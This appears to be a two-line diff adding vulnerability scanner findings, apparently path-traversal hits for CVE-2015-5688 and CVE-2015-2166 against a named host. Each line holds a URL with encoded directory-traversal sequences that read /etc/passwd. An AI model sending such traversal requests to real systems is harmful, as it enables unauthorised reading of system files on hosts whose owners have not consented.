@@ -1,0 +1,2 @@
+[CVE-2015-5688] [http] [medium] https://asr.sarvam.ai/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+[CVE-2015-2166] [http] [medium] https://asr.sarvam.ai/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
